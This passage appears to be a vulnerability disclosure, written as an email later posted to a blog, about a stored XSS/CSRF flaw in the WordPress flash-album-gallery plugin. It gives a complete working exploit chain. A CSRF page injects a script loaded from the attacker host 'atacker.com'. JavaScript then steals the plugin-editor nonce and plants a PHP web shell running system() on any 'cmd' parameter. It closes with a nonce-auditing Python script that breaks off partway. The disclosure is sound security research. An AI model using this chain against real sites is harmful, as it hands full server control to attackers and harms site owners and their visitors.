<span class="x">    </span><span class="cp">&lt;?php</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">                                    &lt;input type=&quot;hidden&quot; name=&quot;mode&quot; value=&quot;save&quot; /&gt;</span>
<span class="x">                                    &lt;input style=&quot;width: 80%;&quot; type=&quot;text&quot; id=&quot;items_array&quot; name=&quot;items_array&quot; readonly=&quot;readonly&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$added</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;</span>
<span class="x">                                    &lt;input type=&quot;hidden&quot; name=&quot;playlist_title&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">esc_html</span><span class="p">(</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$playlist</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]));</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;</span>
<span class="x">===&gt;                                &lt;input type=&quot;hidden&quot; name=&quot;skinname&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$playlist</span><span class="p">[</span><span class="s1">&#39;skin&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;</span>
<span class="x">===&gt;                                &lt;input type=&quot;hidden&quot; name=&quot;skinaction&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$playlist</span><span class="p">[</span><span class="s1">&#39;skin&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;</span>
<span class="x">                                    &lt;textarea style=&quot;display: none;&quot; name=&quot;playlist_descr&quot; cols=&quot;40&quot; rows=&quot;1&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">esc_html</span><span class="p">(</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$playlist</span><span class="p">[</span><span class="s1">&#39;description&#39;</span><span class="p">]));</span> <span class="cp">?&gt;</span><span class="x">&lt;/textarea&gt;</span>
<span class="x">                                    &lt;input name=&quot;addToPlaylist&quot; class=&quot;button-secondary&quot; type=&quot;submit&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="nx">_e</span><span class="p">(</span><span class="s1">&#39;Update Playlist&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;</span>
<span class="x">    </span><span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>Hence, the form which creates the request is also responsible for the
writing the tainted data back to the screen. If find it rather strange
that<br />
all the other echo function usages are wrapped with <code>esc_html()</code> calls
but it was forgotten that $playlist['skin'] holds tainted data as
well.<br />
Maybe the changes in the last fix [As reported by 'Ken S'] weren't that
deep. But more likely, this is just another bug which hasn't been found
before.</p>
<h3>Now what can an attacker do with this exploit?</h3>
<p>He could gain access to the server and remote code execution for
example. Imagine we tricked an wordpress administrator which<br />
still has valid admin cookies for his wordpress site [Which is quite
often the case when you look at your blog] into visiting a<br />
site with a hidden form. You cold for example write a comment on the
wordpress site with a link to the attacking site, which incorporates<br />
the attacking code below. This would be a quite strong attack, since
every wordpress administrator is happy to see comments on his site
[Source:<br />
I am a wordpress admin myself]. Then he is genuinely interested to
follow the link. Why should he assume that it is dangerous? Lot's of
people leave<br />
the link of their own sites in wordpress comment section. As soon as
the wordpress administrator [He needs to be logged in, which is normally
the case]<br />
follows the link, the server is entirely busted. No need to crack
password hashes or find further privilege escalation ways. Why? See
below the code that<br />
is executed if he follows the link:</p>
<div class="highlight"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
        <span class="nt">&lt;title&gt;</span>Stored XSS CSRF exploit.<span class="nt">&lt;/title&gt;</span>
        <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;Content-Type&quot;</span> <span class="na">content=</span><span class="s">&quot;text/html; charset=UTF-8&quot;</span><span class="nt">&gt;</span>

        <span class="nt">&lt;script&gt;</span>
            <span class="kd">function</span> <span class="nx">getXMLHttpRequestObject</span><span class="p">()</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">ref</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">XMLHttpRequest</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// For recent browsers.</span>
                    <span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">ActiveXObject</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Older IE 6,7,8</span>
                    <span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;MSXML2.XMLHTTP.3.0&quot;</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nx">ref</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="kd">function</span> <span class="nx">send_payload</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">TARGET_URL</span> <span class="o">=</span> <span class="s2">&quot;http://localhost/wordpress/wp-admin/admin.php?page=flag-banner-box&amp;playlist=null&amp;mode=edit&quot;</span><span class="p">;</span>
                <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>

                <span class="nx">req</span> <span class="o">=</span> <span class="nx">getXMLHttpRequestObject</span><span class="p">();</span>
                <span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;success_indicator&quot;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&quot;payload sent.&quot;</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="nx">TARGET_URL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
                <span class="nx">req</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span>
                <span class="cm">/* Build the post data */</span>
                <span class="kd">var</span> <span class="nx">pd</span> <span class="o">=</span>  <span class="p">{</span><span class="s2">&quot;playlist_title&quot;</span><span class="o">:</span> <span class="s2">&quot;sometitle&quot;</span><span class="p">,</span>
                           <span class="s2">&quot;playlist_descr&quot;</span><span class="o">:</span> <span class="s2">&quot;some_description&quot;</span><span class="p">,</span>
                           <span class="s2">&quot;mode&quot;</span><span class="o">:</span> <span class="s2">&quot;save&quot;</span><span class="p">,</span>
                           <span class="s2">&quot;skinname&quot;</span><span class="o">:</span> <span class="s1">&#39;&quot; &#39;</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">,</span>
                           <span class="s2">&quot;item_array[0]&quot;</span><span class="o">:</span> <span class="s2">&quot;notimportant&quot;</span><span class="p">};</span>

                <span class="nx">postdata</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
                <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">pd</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">postdata</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">key</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">+</span> <span class="nx">pd</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="nx">postdata</span> <span class="o">=</span> <span class="nx">postdata</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">postdata</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// rstrip the last &amp;</span>

                <span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">postdata</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="nt">&lt;/script&gt;</span> 
    <span class="nt">&lt;/head&gt;</span>

    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;script&gt;</span><span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="s2">&quot;&lt;script type=&quot;</span><span class="nx">text</span><span class="o">/</span><span class="nx">javascript</span><span class="s2">&quot; src=&quot;</span><span class="nx">http</span><span class="o">:</span><span class="err">//atacker.com/exploit.js&quot;&gt;//Nothin here</span><span class="nt">&lt;/script&gt;</span>&quot;; send_payload(payload);<span class="nt">&lt;/script&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">&quot;success_indicator&quot;</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></div>


<p>Then as soon as the payload is executed, the following exploit code is
loaded from another site which actually<br />
does the evil stuff [See code above, the last lines are probably the
most interesting]. It basically uses the upload functionality in
wordpress to change plugincode.<br />
This leads to remote code execution and the worst case scenario
happened: An attacker can issue system() calls with the permissions<br />
of the web server.</p>
<h3>The exploit code:</h3>
<div class="highlight"><pre><span class="cm">/* </span>
<span class="cm"> * Copyright: Nikolai Tschacher.</span>
<span class="cm"> * Site: incolumitas.com</span>
<span class="cm"> * Easy as pie.</span>
<span class="cm"> * What: Use this code when you found a stored XSS in a wordpress plugin to gain RCE.</span>
<span class="cm"> * How: A wordpress admin needs to run this code in his browser with a valid session id.</span>
<span class="cm"> * Idea: Mofify the flash-album-gallery plugin via wordpress admin panel.</span>
<span class="cm"> * </span>
<span class="cm"> * Note: This is actually nothing new. It&#39;s just one of many ways to gain RCE</span>
<span class="cm"> *       if you have a stored XSS in a wordpress session.</span>
<span class="cm"> */</span>

<span class="c1">// Without php tags</span>
<span class="c1">// HTML meta chars are in character entity references format.</span>
<span class="kd">var</span> <span class="nx">EXPLOIT_CODE</span> <span class="o">=</span> <span class="s2">&quot;\nif (isset($_GET[&amp;#039;cmd&amp;#039;])&amp;amp;&amp;amp; !empty($_GET[&amp;#039;cmd&amp;#039;])){ echo &amp;#039;&lt;pre&gt;&amp;#039;;system($_GET[&amp;#039;cmd&amp;#039;]);echo &amp;#039;&lt;/pre&gt;&amp;#039;; }&quot;</span><span class="p">;</span>

<span class="c1">// TARGET SETTINGS. Set stuff here.</span>
<span class="kd">var</span> <span class="nx">TARGET_WP_PATH</span> <span class="o">=</span> <span class="s2">&quot;http://localhost/wordpress&quot;</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">PLUGIN_EDITOR_URL</span> <span class="o">=</span> <span class="nx">TARGET_WP_PATH</span> <span class="o">+</span> <span class="s2">&quot;/wp-admin/plugin-editor.php&quot;</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">PLUGIN_EDIT_URL</span> <span class="o">=</span> <span class="nx">PLUGIN_EDITOR_URL</span> <span class="o">+</span> <span class="s2">&quot;?file=flash-album-gallery/flag.php&quot;</span><span class="p">;</span>


<span class="kd">function</span> <span class="nx">getXMLHttpRequestObject</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">ref</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">XMLHttpRequest</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// For recent browsers.</span>
        <span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">ActiveXObject</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Older IE 6,7,8</span>
        <span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;MSXML2.XMLHTTP.3.0&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">ref</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/* Extract the nonce */</span>
<span class="kd">function</span> <span class="nx">exploit</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>

    <span class="nx">req</span> <span class="o">=</span> <span class="nx">getXMLHttpRequestObject</span><span class="p">();</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="sr">/name=&quot;_wpnonce&quot;\svalue=\&quot;[a-z0-9]{10}\&quot;/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">nonce</span> <span class="o">=</span>  <span class="sr">/[a-z0-9]{10}/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">res</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// The sites not available. Maybe the plugin is not installed?!</span>
                <span class="nx">nonce</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>

            <span class="p">}</span>
            <span class="nx">modify_plugin</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">,</span> <span class="nx">nonce</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="nx">PLUGIN_EDIT_URL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
<span class="p">}</span>

<span class="cm">/* Modify the plugin with malicous code with plugin editor */</span>
<span class="kd">function</span> <span class="nx">modify_plugin</span><span class="p">(</span><span class="nx">responseText</span><span class="p">,</span> <span class="nx">nonce</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Get the plugin code</span>
    <span class="c1">// On each wordpress plugin edit site, there&#39;s just one textarea tag.</span>
    <span class="c1">// The plugin code itself lies between the textarea tags.</span>
    <span class="c1">// These regexes aren&#39;t really good.</span>
    <span class="kd">var</span> <span class="nx">startIndex</span> <span class="o">=</span> <span class="nx">responseText</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/&lt;textarea.*?name=&quot;newcontent&quot;.*?&gt;/</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">stopIndex</span> <span class="o">=</span> <span class="nx">responseText</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/&lt;\/textarea&gt;/</span><span class="p">);</span>
    <span class="nx">pluginCode</span> <span class="o">=</span> <span class="nx">responseText</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">startIndex</span><span class="p">.</span><span class="nx">index</span><span class="o">+</span><span class="nx">startIndex</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">length</span><span class="p">,</span> <span class="nx">stopIndex</span><span class="p">.</span><span class="nx">index</span><span class="p">);</span>

    <span class="c1">// add our exploit code at the beginning of the plugin after the &quot;// Stop direct call&quot; comment.</span>
    <span class="k">if</span> <span class="p">(</span><span class="sr">/((\/){2}\sStop\sdirect\scall)/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">pluginCode</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">pluginCode</span> <span class="o">=</span> <span class="nx">pluginCode</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/((\/){2}\sStop\sdirect\scall)/</span><span class="p">,</span> <span class="s2">&quot;$1&quot;</span> <span class="o">+</span> <span class="nx">EXPLOIT_CODE</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="c1">// Let&#39;s go for the first line after the obligatory wp plugin comment and lets use the closing comment</span>
        <span class="c1">// characters */ as needle as a fallback.</span>
        <span class="nx">pluginCode</span> <span class="o">=</span> <span class="nx">pluginCode</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^(\*\/)/m</span><span class="p">,</span> <span class="s2">&quot;$1&quot;</span> <span class="o">+</span> <span class="s2">&quot;\n&quot;</span> <span class="o">+</span> <span class="nx">EXPLOIT_CODE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// We need to consider that the plugin code in this state is making use of Character entity references</span>
    <span class="c1">// for all html meta characters like &quot; &#39; &lt; &gt; &amp; \ to avoid them of being interepreted as markup.</span>
    <span class="c1">// We need to replace them with their &quot;real&quot; characters, before we send the plugin as post data.</span>
    <span class="nx">pluginCode</span> <span class="o">=</span> <span class="nx">removeCharEntityReferences</span><span class="p">(</span><span class="nx">pluginCode</span><span class="p">);</span>

    <span class="c1">// Ready to build our POST request</span>
    <span class="nx">preq</span> <span class="o">=</span> <span class="nx">getXMLHttpRequestObject</span><span class="p">();</span>
    <span class="nx">preq</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">preq</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">preq</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">successPattern</span> <span class="o">=</span> <span class="sr">/File\sedited\ssuccessfully./</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">successPattern</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">preq</span><span class="p">.</span><span class="nx">responseText</span><span class="p">))</span>
                <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Done.&quot;</span><span class="p">);</span>
                <span class="c1">// Notify the attacker that the exploit has been spawned.</span>
            <span class="k">else</span>
                <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Nope.&quot;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">};</span>
    <span class="nx">preq</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="nx">PLUGIN_EDITOR_URL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">preq</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">,</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span>

    <span class="nx">pd</span> <span class="o">=</span> <span class="p">{</span>
        <span class="nx">_wpnonce</span><span class="o">:</span> <span class="nx">nonce</span><span class="p">,</span>
        <span class="nx">_wp_http_referer</span><span class="o">:</span> <span class="nx">PLUGIN_EDIT_URL</span> <span class="o">+</span> <span class="s2">&quot;&amp;a=te&amp;scrollto=0&quot;</span><span class="p">,</span>
        <span class="nx">a</span><span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
        <span class="nx">scrollto</span><span class="o">:</span> <span class="s2">&quot;192&quot;</span><span class="p">,</span>
        <span class="nx">newcontent</span><span class="o">:</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">pluginCode</span><span class="p">),</span>
        <span class="nx">action</span><span class="o">:</span> <span class="s2">&quot;update&quot;</span><span class="p">,</span>
        <span class="nx">file</span><span class="o">:</span> <span class="s2">&quot;flash-album-gallery/flag.php&quot;</span><span class="p">,</span>
        <span class="nx">plugin</span><span class="o">:</span> <span class="s2">&quot;flash-album-gallery/flag.php&quot;</span><span class="p">,</span>
        <span class="nx">submit</span><span class="o">:</span> <span class="s2">&quot;Update+File&quot;</span>
    <span class="p">};</span>
    <span class="c1">// Build the post data.</span>
    <span class="nx">postdata</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">pd</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">postdata</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">key</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">+</span> <span class="nx">pd</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nx">postdata</span> <span class="o">=</span> <span class="nx">postdata</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">postdata</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// rstrip the last &amp;</span>
    <span class="nx">preq</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">postdata</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/*</span>
<span class="cm"> * Removes the HTML char entity references for the HTML meta characters.</span>
<span class="cm"> */</span>
<span class="kd">function</span> <span class="nx">removeCharEntityReferences</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="k">typeof</span> <span class="nx">data</span><span class="p">)</span> <span class="o">!==</span> <span class="s2">&quot;string&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nx">TypeError</span><span class="p">(</span><span class="s2">&quot;data needs to be a string&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;quot;/g</span><span class="p">,</span> <span class="s2">&quot;\&quot;&quot;</span><span class="p">);</span>
    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;#039;/g</span><span class="p">,</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">);</span>
    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;lt;/g</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">);</span>
    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;gt;/g</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">);</span>
    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;amp;/g</span><span class="p">,</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">);</span>

    <span class="k">return</span> <span class="nx">data</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">exploit</span><span class="p">();</span>
</pre></div>


<h3>Conclusion</h3>
<p>What was shown above, is just one specific bug in the
flash-album-gallery plugin. I think that there might be lots more. If
you want to see me notes<br />
of my work, please visit the following file I made during my research
at very bottom of this [large] mail.</p>
<p>But honestly, I have to say you that there are still lots of bugs in the
code and that it would need a rather large amount of time and<br />
some dull hours of work to locate the vast majority of them [Forget
about finding all bugs in software in general]. This means, that I<br />
won't continue spending a lot of time on this project.</p>
<p>Additionally, I have sent this writeup to the wordpress-security bug
bounty program because you know, I would always be happy for some dimes
to<br />
keep my server runnin :D</p>
<p>If you have questions, feel free to contact me.</p>
<p>I am going to publish this mail on my blog as soon as you guys updated
the code and the users had some time to switch versions. But please keep
in mind:<br />
I would really do some serious work in order to find all the bugs!</p>
<p>I advise to uninstall it and NOT use this plugin, before big changes are
made to improve the security architecture.</p>
<p>PS: Maybe you are interested too have a look on the script I wrote to
locate bugs like this:</p>
<div class="highlight"><pre><span class="c"># PYTHON NONCE INCONSISTENT USE REVEALER</span>
<span class="c"># COPYRIGHT: Nikolai Tschacher</span>
<span class="c"># Site: incolumitas.com</span>

<span class="c"># Walks thorugh a plugin and tries to reveals some inconsistency with nonces which</span>
<span class="c"># could lead to some vulnerabilities. Sometimes, nonces are created, but never validated.</span>
<span class="c"># Just a nonce itself does nothing, the action must be actually confirmed.</span>

<span class="c"># This simply finds all nonces and looks if some stay unchecked. If this is the case, the</span>
<span class="c"># nonce is useless and there&#39;s maybe a threat.</span>

<span class="c"># About: http://www.prelovac.com/vladimir/improving-security-in-wordpress-plugins-using-nonces</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">fnmatch</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>

<span class="c"># If a nonce is created but never checked with wp_verify_nonce() (or descendants), the nonce is</span>
<span class="c"># senseless and no security barrier at all. This script tries to find this flaw.</span>

<span class="c"># Nonces are random, one time tokens which are usally send with a critical request/form</span>
<span class="c"># a user can execute in a application. Before the action takes place, the app has to confirm</span>
<span class="c"># that the nonce is the same as genertated while the form was crafted. If this is not the case,</span>
<span class="c"># a user is most likely tricked into submitting a form without his consent, since he has never</span>
<span class="c"># seen the form and thus the nonce hasn&#39;t been created and automatically submitted. This prevents</span>
<span class="c"># CSRF attacks and makes most sql injections and xss attacks rather hard.</span>

<span class="c"># Approach: We treat simply all strings between braces as possible action arguments. There will be</span>
<span class="c"># a lot of false positives. But making the regex accurate is simply not feasible because the function</span>
<span class="c"># calling syntax is ways to hard to parse [lazy and yeah, guilty :D]</span>
<span class="n">R_NONCE_CREATION</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">r&#39;(wp_nonce_field|wp_create_nonce|wp_nonce_url)(\s*)\(.*?\)&#39;</span><span class="p">)</span>

<span class="n">R_STRING</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">r&#39;(</span><span class="se">\&#39;</span><span class="s">|&quot;).*?\1&#39;</span><span class="p">)</span>

<span class="c"># Nonces are normally confirmed before the critical action in wp code begins.</span>
<span class="c"># There are several functions to confirm nonces depending on the situation</span>
<span class="c"># the form/actions orign. They can be found in \wp-includes\pluggable.php</span>
<span class="c"># - wp_verify_nonce($nonce, $action = -1)</span>
<span class="c"># - check_ajax_referer( $action = -1, $query_arg = false, $die = true )</span>
<span class="c"># - check_admin_referer($action = -1, $query_arg = &#39;_wpnonce&#39;)</span>
<span class="n">R_NONCE_CHECK</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">r&#39;(check_ajax_referer|wp_verify_nonce|check_admin_referer)(\s*)\(.*?\)&#39;</span><span class="p">)</span>

<span class="n">matches</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">checked</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">def</span> <span class="nf">apply_on_file_content</span><span class="p">(</span><span class="n">root_path</span><span class="p">,</span> <span class="n">callback</span><span class="p">):</span>
    <span class="n">pattern</span> <span class="o">=</span> <span class="s">&#39;.php&#39;</span>
    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">root_path</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">fname</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">pattern</span> <span class="ow">in</span> <span class="n">fname</span><span class="p">:</span>
